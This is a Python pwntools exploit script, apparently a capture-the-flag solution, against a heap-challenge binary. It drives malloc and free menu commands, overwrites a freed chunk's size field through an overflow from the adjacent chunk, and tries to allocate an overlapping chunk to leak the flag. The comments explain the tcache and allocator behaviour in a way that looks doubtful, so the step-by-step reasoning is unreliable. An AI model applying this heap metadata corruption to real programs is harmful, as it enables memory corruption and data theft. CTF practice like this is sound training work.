from pwn import *

binary = './babyheap_level19.0_patched'
p = process(binary)

def malloc(index, size):
    p.sendlineafter("quit): ", "malloc")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Size: ", str(size))

def free(index):
    p.sendlineafter("quit): ", "free")
    p.sendlineafter("Index: ", str(index))

def safe_read(index, data):
    p.sendlineafter("quit): ", "safe_read")
    p.sendlineafter("Index: ", str(index))
    p.sendline(data)

def safe_write(index):
    p.sendlineafter("quit): ", "safe_write")
    p.sendlineafter("Index: ", str(index))

def read_flag():
    p.sendlineafter("quit): ", "read_flag")

# Step 1: Allocate two chunks
malloc(0, 0x18)  # Chunk 0
malloc(1, 0x88)  # Chunk 1 - we'll free this
malloc(2, 0x18)  # Chunk 2 - to prevent consolidation with top chunk

# Step 2: Free chunk 1 - it goes into the appropriate tcache bin
free(1)

# Step 3: Corrupt chunk 1's metadata from chunk 0
# The key insight: Increasing the size of a free chunk will make the
# allocator think it's larger than it actually is
safe_read(0, b'A' * 0x10 + p64(0) + p64(0x421))  # Significantly larger size

# Step 4: Read the flag (allocates memory after chunk 2)
read_flag()

# Step 5: Request a chunk that fits in the "larger" free chunk
# but only uses the first part of it
malloc(1, 0x88)  # Reuse the beginning of chunk 1

# Step 6: Request another chunk that will overlap with the flag
# Since we corrupted chunk 1's size to be much larger,
# the allocator thinks there's more space available
malloc(3, 0x200)  # This should overlap with the flag buffer

# Step 7: Print the content of our overlapping chunk
safe_write(3)

p.interactive()
